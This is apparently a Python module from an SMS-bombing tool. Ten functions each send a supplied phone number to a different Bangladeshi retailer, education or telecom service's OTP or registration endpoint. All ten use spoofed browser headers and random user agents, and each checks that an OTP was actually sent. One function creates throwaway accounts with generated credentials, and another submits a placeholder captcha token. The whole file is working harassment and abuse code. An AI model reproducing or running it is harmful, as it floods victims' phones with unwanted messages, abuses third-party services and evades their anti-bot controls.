import requests
import hashlib
from .utils import send_request, get_random_user_agent

def api_1(number):
    url = "https://ecom.rangs.com.bd/send-otp-code"
    mobile = f'+88{number}'
    fixed_string = "eyJpdiI6ImY5REF3UGdRZG0zLzhHNFRNNnIwZXc9PSIsInZhbHVlIjoiUmhqVU1lYVpxYUNIU2c5TmR1VVFwRTZQc0d1amNYS2ZlWkNubEtUbzM2QTlGYTJQTzMwRTFvVitxUGF6M3A1WSIsIm1hYyI6ImMxYzEyYjUwZTU2Njk2ZDk0Mzk2ZGNjZjMxYTVjMmRkMjA0M2MwMjdlMjU1NmIwMjEwM2Q5NmUyOGE0NzVjNmIiLCJ0YWciOiIifQ"
    hash_val = hashlib.sha256((mobile + fixed_string).encode()).hexdigest()
    
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://shop.rangs.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://shop.rangs.com.bd/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'mobile': mobile,
        'type': 1,
        'hash': hash_val,
    }
    response = send_request(url, "POST", headers, data)
    
    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == 1:
                return response
            else:
                print(f"api_1 Validation Failed: {json_data}")
                response.status_code = 400 # Mark as bad request dynamically if content is wrong
                return response
    except Exception as e:
        print(f"api_1 Validation Error: {e}")
    
    return response

def api_2(number):
    url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pbs.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://pbs.com.bd/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'userPhone': number,
        'otp': '',
    }
    response = send_request(url, "POST", headers, data)
    
    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("isSuccess") is True and json_data.get("statusCode") == 200:
                return response
            else:
                print(f"api_2 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_2 Validation Error: {e}")

    return response

def api_3(number):
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://osudpotro.com',
        'priority': 'u=1, i',
        'referer': 'https://osudpotro.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'mobile': f'+88-{number}',
        'deviceToken': 'web',
        'language': 'en',
        'os': 'web',
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") is True:
                return response
            else:
                print(f"api_3 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_3 Validation Error: {e}")

    return response

def api_4(number):
    try:
        url_home = "https://fundesh.com.bd/fundesh/profile"
        headers_home = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        response_home = requests.get(url_home, headers=headers_home, timeout=None)
        cookies = response_home.cookies.get_dict()
        
        url = "https://fundesh.com.bd/api/auth/generateOTP"
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/json; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://fundesh.com.bd',
            'priority': 'u=1, i',
            'referer': 'https://fundesh.com.bd/fundesh/profile',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': get_random_user_agent(),
        }
        params = {
            'service_key': '',
        }
        data = {
            'msisdn': number[1:] if number.startswith('0') else number,
        }
        response = send_request(url, "POST", headers, data, cookies)
        
        # Response Validation
        try:
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get("status") == "OTP_SENT_SUCCESS":
                    return response
                else:
                    print(f"api_4 Validation Failed: {json_data}")
                    response.status_code = 400
                    return response
        except Exception as e:
            print(f"api_4 Validation Error: {e}")

        return response
    except Exception as e:
        print(f"API 4 error: {e}")
        return None

def api_5(number):
    url = "https://api.shikho.com/auth/v2/send/sms"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://shikho.com',
        'priority': 'u=1, i',
        'referer': 'https://shikho.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'phone': f'88{number}',
        'type': 'student',
        'auth_type': 'signup',
        'vendor': 'shikho',
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("code") == 200:
                return response
            else:
                print(f"api_5 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_5 Validation Error: {e}")

    return response

def api_6(number):
    url = "https://api.apex4u.com/api/auth/login"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://apex4u.com',
        'priority': 'u=1, i',
        'referer': 'https://apex4u.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    data = {
        'phoneNumber': number,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("OtpExist") is True:
                return response
            else:
                print(f"api_6 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_6 Validation Error: {e}")

    return response

def api_7(number):
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "bkshopthc.grameenphone.com",
        "User-Agent": get_random_user_agent(),
    }
    data = {"phone": number, "language": "en", "email": ""}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") is True:
                return response
            else:
                print(f"api_7 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_7 Validation Error: {e}")

    return response

def api_8(number):
    url = "https://app.deshal.net/api/auth/login"
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://www.deshal.net',
        'Referer': 'https://www.deshal.net/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': get_random_user_agent(),
        'content-type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'phone': number,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("msg") == "An OTP has been sent to the customer phone.":
                return response
            else:
                print(f"api_8 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_8 Validation Error: {e}")

    return response

def api_9(number, pgen, egen, did, name):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://easy.com.bd',
        'Referer': 'https://easy.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': get_random_user_agent(),
        'device-key': did,
        'lang': 'en',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'social_login_id': '',
        'name': name,
        'email': f'{egen}@gmail.com',
        'mobile': number,
        'password': pgen,
        'password_confirmation': pgen,
        'device_key': did,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == "success":
                return response
            else:
                print(f"api_9 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_9 Validation Error: {e}")

    return response

def api_10(number):
    url = "https://api.garibookadmin.com/api/v3/user/login"
    headers = {
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://garibook.com',
        'Referer': 'https://garibook.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': get_random_user_agent(),
        'accept': 'application/json',
        'content-type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'mobile': number,
        'recaptcha_token': 'garibookcaptcha',
        'channel': 'web',
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == 200:
                return response
            else:
                print(f"api_10 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_10 Validation Error: {e}")

    return response